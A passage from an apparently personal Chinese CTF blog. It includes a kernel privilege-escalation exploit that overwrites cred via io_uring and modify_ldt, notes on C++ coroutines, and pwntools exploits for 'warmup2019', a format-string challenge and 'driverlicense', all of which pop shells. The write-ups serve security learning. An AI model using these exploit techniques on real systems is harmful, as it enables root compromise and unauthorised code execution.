class="hljs-literal">NULL</span>);<br>        read(pipe_fd[<span class="hljs-number">0</span>], &amp;cred_addr, <span class="hljs-number">8</span>);<br>        <span class="hljs-keyword">if</span> (cred_addr != <span class="hljs-number">-1</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> cred_addr;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">spawn_root_shell</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; ProcessNUM; i++)<br>    &#123;<br>        kill(processes[i], SIGCONT);<br>    &#125;<br>    <span class="hljs-keyword">while</span>(wait(<span class="hljs-literal">NULL</span>) &gt; <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_desc</span> <span class="hljs-title">desc</span>;</span><br>    <span class="hljs-keyword">size_t</span> leak_heap,cred;<br>    <span class="hljs-keyword">size_t</span> Data[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-built_in">memset</span>(Data,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(Data));<br>    <span class="hljs-built_in">memset</span>(&amp;desc,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(struct user_desc));<br>    <span class="hljs-keyword">char</span> leak[<span class="hljs-number">0x10</span>];<br>    fd = open(<span class="hljs-string">&quot;/dev/game&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span>(fd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;fail to open dev&quot;</span>);<br><br>    ioctl(fd,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    spawn_processes();<br><br><span class="hljs-comment">//1. leak heap addr</span><br>    ioctl(fd,<span class="hljs-number">114</span>,<span class="hljs-string">&quot;flag=123456789&quot;</span>);<span class="hljs-comment">//kmalloc(0x10) == context-&gt;cur-&gt;magic</span><br>    init_uring();<br>    ioctl(fd,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    ioctl(fd,<span class="hljs-number">114</span>,<span class="hljs-string">&quot;flag=123456789&quot;</span>);<span class="hljs-comment">//kfree</span><br>    syscall(SYS_modify_ldt, <span class="hljs-number">1</span>, &amp;desc, <span class="hljs-keyword">sizeof</span>(desc));<span class="hljs-comment">//write_ldt</span><br>    read(fd,leak,<span class="hljs-number">0x10</span>);<span class="hljs-comment">//leak, 使用ldt_struct第一个指针(也是指向heap). </span><br>    leak_heap = *(<span class="hljs-keyword">size_t</span>*)leak;<br>    <span class="hljs-keyword">if</span>((!leak_heap))<br>        errExit(<span class="hljs-string">&quot;\033[31m[-] Could not leak heap_addr \033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] leak heap_addr: \033[0m0x%lx\n&quot;</span>, leak_heap);<br><br><span class="hljs-comment">//2. Find cred&#x27;struct by arbitrary address read </span><br>    ioctl(fd,<span class="hljs-number">22</span>,<span class="hljs-number">0</span>);<span class="hljs-comment">//kfree</span><br>    Data[<span class="hljs-number">0</span>] = leak_heap;<br>    register_tag(&amp;ring,Data,<span class="hljs-number">2</span>);<span class="hljs-comment">//kzalloc</span><br>    cred = find_cred(leak_heap);<br><br><span class="hljs-comment">//3. Overwrite uid and gid by Arbitrary address write</span><br>    close(fd);<br>    fd = open(<span class="hljs-string">&quot;/dev/game&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span>(fd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;fail to open dev&quot;</span>);<br>    ioctl(fd,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    ioctl(fd,<span class="hljs-number">114</span>,<span class="hljs-string">&quot;flag=123456789&quot;</span>);<span class="hljs-comment">//kmalloc(0x10)</span><br>    ioctl(fd,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>    ioctl(fd,<span class="hljs-number">114</span>,<span class="hljs-string">&quot;flag=123456789&quot;</span>);<span class="hljs-comment">//kfree</span><br>    register_tag(&amp;ring1,Data,PAGESIZE/<span class="hljs-number">8</span> + <span class="hljs-number">1</span>);<span class="hljs-comment">//io_alloc_page_table</span><br>    ioctl(fd,<span class="hljs-number">22</span>,<span class="hljs-number">0</span>);<span class="hljs-comment">//kfree</span><br>    Data[<span class="hljs-number">0</span>] = cred+<span class="hljs-number">4</span>;<br>    register_tag(&amp;ring2,Data,<span class="hljs-number">2</span>);<span class="hljs-comment">//tags[0] = cred+4</span><br>    Data[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    update_tag(&amp;ring1,Data,<span class="hljs-number">1</span>);<span class="hljs-comment">//&#123;long&#125;cred+4 = 0</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">3</span>;i++)&#123; <span class="hljs-comment">//overwrite two ids and groups</span><br>        Data[<span class="hljs-number">0</span>] = cred+<span class="hljs-number">4</span>+<span class="hljs-number">8</span>*(i+<span class="hljs-number">1</span>);<br>        update_tag(&amp;ring2,Data,<span class="hljs-number">1</span>);<span class="hljs-comment">//tags[0] = cred+4+8*(i+1)</span><br>        Data[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>        update_tag(&amp;ring1,Data,<span class="hljs-number">1</span>);<span class="hljs-comment">//&#123;long&#125;cred+4+8*(i+1) = 0</span><br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Done \033[0m&quot;</span>);<br>    spawn_root_shell();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m[-] It should never be here \033[0m&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<h1 id="idek2022"><a href="#idek2022" class="headerlink" title="idek2022"></a>idek2022</h1><h2 id="Coroutine"><a href="#Coroutine" class="headerlink" title="Coroutine"></a>Coroutine</h2><p>主要看<a target="_blank" rel="noopener" href="https://kiprey.github.io/2023/01/idek_coroutine/">肖佬的wp</a>. 做一点个人补充. </p>
<p>什么是协程: <a target="_blank" rel="noopener" href="https://lewissbaker.github.io/2017/11/17/understanding-operator-co-await">比较全的英文blog</a> | <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/497224333">CSDN官方文章</a> | <a target="_blank" rel="noopener" href="https://en.cppreference.com/w/cpp/language/coroutines">cppref</a>: 第二者的例子中并没有<code>.resume</code>操作, 直接sleep代替了, 不太完善. </p>
<p><a target="_blank" rel="noopener" href="https://devblogs.microsoft.com/oldnewthing/20210329-00/?p=105015">非常全的 MS blog</a> 太多了反而看不过来. </p>
<ul>
<li><code>co_await co_yield co_return</code> 有一个关键字该函数就算是协程. </li>
<li><code>struct promise_type</code>用于定义一类协程的行为, 编译器还会把coroutine_handle紧挨着promise_type一起放在协程栈帧的开头.<br>The <code>Promise</code> type is <strong>determined by</strong> the compiler from <strong>the return type of the coroutine</strong> using <a target="_blank" rel="noopener" href="https://en.cppreference.com/w/cpp/coroutine/coroutine_traits">std::coroutine_traits</a>. </li>
<li>而跟在<code>co_wait</code>后的是一个struct, 定义了 await_ready、await_suspend 和 await_resume 方法的类型. </li>
<li><code>co_wait</code>展开后是如下红色区域, 在主线程创建新线程后, 满足一定条件时会返回caller, 当可以继续执行时在主线程执行<code>handle.resume()</code>, 子线程就会继续执行协程中剩余代码. 一个<a target="_blank" rel="noopener" href="https://godbolt.org/z/nbM5YcWeT">代码例子</a>. </li>
</ul>
<img title="" src="https://s2.loli.net/2023/02/16/LJGcbS9DlR5IadH.jpg" srcset="/img/loading.gif" lazyload alt="img"  width="488">

<p>尝试复现中遇到一点小问题:</p>
<ul>
<li>代码例子中编译选项要加上-fcoroutines. </li>
<li>vscode无法识别coroutine, 要在C++ Intellisense-&gt;Cpp standard选择C++20. </li>
<li>一看代码没发现bind, 结果是直接使用默认port, 然后stdout传给py脚本, 再用socat来export特定端口(12345). </li>
<li>复习了std::span和std::optional. </li>
<li><code>final_suspend()</code>在cppref都搜不到怎么suspend. 好吧有一句calls <code>promise.final_suspend()</code> and <strong>co_awaits</strong> the result. 所以说final_suspend可以返回Awaiter, 而不是简单直接的never_suspend. </li>
<li></li>
</ul>
<h1 id="triathlon"><a href="#triathlon" class="headerlink" title="triathlon"></a>triathlon</h1><h2 id="warmup2019"><a href="#warmup2019" class="headerlink" title="warmup2019"></a>warmup2019</h2><p><strong>32位程序</strong>. libc疑似2.23, 太低了都跑不起来. woc下载了2.24之后chlibc跑起来了. 之前的工作还是整得不错. </p>
<p>atoi可返回负数, 然后使用alloca把esp弄到返回地址处, 然后使用one_gadget. 条件中看到got address of libc,<br>也就是<code>0x1b0000</code>通过<code>readelf -d libc.so | grep PLTGOT</code>得到的value. 而且main函数中没有stack canary check, 只有装载(还能这样).</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-number">0x3a80c</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, esp+<span class="hljs-number">0x28</span>, environ)  <br>constraints:    <br>  esi is the GOT address of libc<br>  [esp+<span class="hljs-number">0x28</span>] == <span class="hljs-literal">NULL</span><br>      <br><span class="hljs-number">0x3a80e</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, esp+<span class="hljs-number">0x2c</span>, environ) <br>constraints:<br>  esi is the GOT address of libc<br>  [esp+<span class="hljs-number">0x2c</span>] == <span class="hljs-literal">NULL</span><br><br><span class="hljs-number">0x3a812</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, esp+<span class="hljs-number">0x30</span>, environ)<br>constraints:<br>  esi is the GOT address of libc<br>  [esp+<span class="hljs-number">0x30</span>] == <span class="hljs-literal">NULL</span><br><br><span class="hljs-number">0x3a819</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, esp+<span class="hljs-number">0x34</span>, environ)<br>constraints:<br>  esi is the GOT address of libc<br>  [esp+<span class="hljs-number">0x34</span>] == <span class="hljs-literal">NULL</span><br><br><span class="hljs-number">0x5f065</span> execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, eax)<br>constraints:<br>  esi is the GOT address of libc<br>  eax == <span class="hljs-literal">NULL</span><br><br><span class="hljs-number">0x5f066</span> execl(<span class="hljs-string">&quot;/bin/sh&quot;</span>, [esp])<br>constraints:<br>  esi is the GOT address of libc<br>  [esp] == <span class="hljs-literal">NULL</span><br></code></pre></div></td></tr></table></figure>

<p>怕不是因为one_gadget给我默认了64位操作, 然后constraints是寄存器啊. 没事了确实可以, 换成下载好的libc即可</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>ss = <span class="hljs-keyword">lambda</span> data :p.send(data)<br>sa = <span class="hljs-keyword">lambda</span> delim,data :p.sendafter(delim, data)<br>sl = <span class="hljs-keyword">lambda</span> data :p.sendline(data)<br>sla = <span class="hljs-keyword">lambda</span> delim,data :p.sendlineafter(delim, data)<br>ra = <span class="hljs-keyword">lambda</span> :p.recv()<br>rc = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span> :p.recv(numb)<br>ru = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span> :p.recvuntil(delims, drop)<br>uu32 = <span class="hljs-keyword">lambda</span> data :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> data :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>itt = <span class="hljs-keyword">lambda</span> :p.interactive()<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><span class="hljs-comment">#offset from zero</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>    glibc_dir = <span class="hljs-string">&#x27;/glibs/glibc-2.23/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    <span class="hljs-comment"># elf_base = int(os.popen(&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print\x241&#125;&#125;\x27&#x27;.format(p.pid)).readlines()[1], 16) if elf.pie else 0</span><br>    elf_base = <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript+<span class="hljs-string">&#x27;init-pwndbg\nni\n&#x27;</span>)<br>    time.sleep(<span class="hljs-number">1</span>)<br>    <br>binary = <span class="hljs-string">&#x27;./warmup2019.elf64&#x27;</span><br>elf = ELF(binary)<br>libc = ELF(<span class="hljs-string">&#x27;/glibs/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;</span>)<br>p = process(binary, aslr=<span class="hljs-literal">False</span>)<br>context(binary = elf ,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># debug()</span><br><br>got_put = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>plt_put = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>addr_start = <span class="hljs-number">0x80484B0</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">16</span>, plt_put, addr_start, got_put])<br><br>ru(<span class="hljs-string">&#x27;size &gt;&gt; &#x27;</span>)<br>sl(<span class="hljs-string">&#x27;-128&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;content &gt;&gt; &#x27;</span>)<br><span class="hljs-comment"># sl(&#x27;nothing to send&#x27;)</span><br>ru(<span class="hljs-string">&#x27;name &gt;&gt; &#x27;</span>)<br>sl(pl)<br><br><span class="hljs-comment"># itt()</span><br><br>puts_libc_off = libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>puts_addr = uu32(rc(<span class="hljs-number">4</span>))<br>libc_base = (puts_addr - puts_libc_off) <span class="hljs-comment">#&amp; 0xfffff000</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br>one_gadget = libc_base + <span class="hljs-number">0x5fbd5</span><br>pop_esi = <span class="hljs-number">0x080487a9</span><br>libc_got = libc_base + <span class="hljs-number">0x1b3000</span><br><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">16</span>, pop_esi, libc_got, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>*<span class="hljs-number">2</span>, one_gadget, addr_start])<br>ru(<span class="hljs-string">&#x27;size &gt;&gt; &#x27;</span>)<br>sl(<span class="hljs-string">&#x27;-128&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;content &gt;&gt; &#x27;</span>)<br><span class="hljs-comment"># sl(&#x27;nothing to send&#x27;)</span><br>debug(<span class="hljs-number">0x08048730</span>)<br>ru(<span class="hljs-string">&#x27;name &gt;&gt; &#x27;</span>)<br>sl(pl)<br><br><br>itt()<br></code></pre></div></td></tr></table></figure>

<p>好基础的题目, 都快写的不利索了. </p>
<h2 id="junk"><a href="#junk" class="headerlink" title="junk"></a>junk</h2><p>居然做了一道rev题目, 花指令加上中国剩余定理解线性同余方程组, 没啥好说的. </p>
<p>还有简单堆题和格式化字符串, 都没看出来是啥. 绝了. </p>
<h2 id="fmtstr"><a href="#fmtstr" class="headerlink" title="fmtstr"></a>fmtstr</h2><p>看着名字就挺简单的, 但是居然没有做出来…</p>
<p>只有<code>main-&gt;notice</code>函数中有fmtstr:</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">notice</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    read(<span class="hljs-number">0</span>, s1, <span class="hljs-number">0x30</span>uLL);<br>    MEMORY[<span class="hljs-number">0x5555555580B0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(s1, <span class="hljs-string">&quot;fakepwn&quot;</span>, <span class="hljs-number">7uLL</span>) )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your password &quot;</span>);<br>    <span class="hljs-built_in">printf</span>(s1);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; is wrong, plz try again&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;password check ok&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p><del>第六行属实意义不明, 是bss段中的一个位置, 但是watch地址之后全过程只有这里改变了值</del>. 原来是s1末尾强制加上了空字符. </p>
<p>执行到L10时, 发现rsi在库函数执行中改变了值, 是栈上的指针, 而且比当前的栈位置还要高(低地址). 估计只是个临时存放的位置. </p>
<p>用这个来leak地址: <code>%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</code> </p>
<p>发现在第九个参数上有libc的地址, 可以<code>-0x227620</code>计算得到libc_base, 然后加上<code>0xe6af1</code>得到要求r15和rdx为空的one_gadget. 正好发现在main函数返回时这两个为NULL. </p>
<p>继续可以发现这第九个就是main返回地址. 构造:</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-string">&quot;%2$4159421169c%9$n&quot;</span><br></code></pre></div></td></tr></table></figure>

<p>??????????????????????????????不知道怎么做了. </p>
<h2 id="driverlicense"><a href="#driverlicense" class="headerlink" title="driverlicense"></a>driverlicense</h2><p>会了之后就挺简单的, 就是过程有点坎坷. </p>
<p>简单说来就是string的operator=对于小于<code>15/charT</code>(一般是15)的长度的字符串会存放在32字节中后16字节的buffer union中. main函数中canary上面的一个72字节数组成员为两个string加上一个四字节year(实际8字节,但没用), update函数是写入点, show函数是泄露点, 而前者发现对<code>c_str(lic_struct.comment)</code>(即取出string开始8字节的指针)执行<code>malloc_usable_size</code>函数, 这个函数对于存放数据于缓冲区的string来说会生成一个巨大的值, 而<code>read_raw</code>逐字节读取的循环变量是无符号的, 这样漏洞点就明了了起来, 在这里发生越界写入, 覆盖lic_struct.name成员, 修改指针完成任意读原语, 最后栈溢出+刚得到的canary值覆盖main返回地址, 成功pop shell. </p>
<p>我这里的卡点在于: </p>
<ul>
<li>第一步, 发现&lt;=15会在buffer上, 用了四五十分钟, 还是在不断的尝试中发现先写一个短字符串然后update稍长一点输出并没有改变, 进而发现cout是根据length来输出string的; 发现先写一个短的, 然后非常长的, 发现段错误, 返回地址被改写, 发现是分配在stack buffer中. </li>
<li>第二步, 一点点写出exp框架, 写一点测试一点, 发现并不知道stack地址, 查得要使用libc中的environ变量. </li>
<li>第三步, 远程发现环境不对, 不知道environ到canary的偏移, 调了一会肉眼看出偏差. 代码没全改过来卡了一会, 怀疑string析构发现指针没指向buffer就会调用free, 进而导致释放非法块: <code>munmap_chunk(): invalid pointer: 0x00007fff1dd8bfe0</code>. 所以name的指针要对. </li>
<li>然后发现canary不对, 结果是漏了一个year成员少了8字节. </li>
<li>然后又发现one_gadget返回EOF. 结果不明, 换成ROP又算错偏移卡了一会儿. </li>
<li>最后十分钟已经做出, 结果错的太多愣是没发现没报错也没EOF. 最后五分钟内终于在一点点改<code>/bin/sh</code>字符串的时候确定已经pop成功了…..</li>
</ul>
<p>大概用了三个多小时吧, 总算没零封了. </p>
<p>命运之多舛啊………………….</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>ss = <span class="hljs-keyword">lambda</span> data :p.send(data)<br>sa = <span class="hljs-keyword">lambda</span> delim,data :p.sendafter(delim, data)<br>sl = <span class="hljs-keyword">lambda</span> data :p.sendline(data)<br>sla = <span class="hljs-keyword">lambda</span> delim,data :p.sendlineafter(delim, data)<br>rl = <span class="hljs-keyword">lambda</span> keep=<span class="hljs-literal">True</span>:p.recvline(keep)<br>rc = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span> :p.recv(numb)<br>ru = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span> :p.recvuntil(delims, drop)<br>uu32 = <span class="hljs-keyword">lambda</span> data :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> data :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>itt = <span class="hljs-keyword">lambda</span> :p.interactive()<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>    <span class="hljs-keyword">if</span> args.REMOTE <span class="hljs-keyword">or</span> (<span class="hljs-keyword">not</span> args.DBG): <span class="hljs-keyword">return</span><br>    elf_base = <span class="hljs-number">0</span><br>    gdbscript = <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript+<span class="hljs-string">&#x27;init-pwndbg\nni\n&#x27;</span>)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>path_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span> <span class="hljs-keyword">if</span> args.REMOTE <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>libc = ELF(path_libc)<br>binary = <span class="hljs-string">&#x27;./pwn.elf64&#x27;</span><br>elf = ELF(binary)<br>p = process(binary, aslr=<span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> args.REMOTE <span class="hljs-keyword">else</span> remote(<span class="hljs-string">&quot;172.31.0.49&quot;</span>, <span class="hljs-number">10001</span>)<br>context(binary = elf ,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment">#debug()</span><br><br><br>sl(<span class="hljs-string">b&#x27;01&#x27;</span>);sl(<span class="hljs-string">&#x27;2&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;\xde\xad&#x27;</span>) <span class="hljs-comment"># 2 bytes</span><br>ru(<span class="hljs-string">b&#x27;comment &gt;&gt; &#x27;</span>)<br><br><span class="hljs-comment">#now update to overwrite name str size and **change name str to read&#x27;s 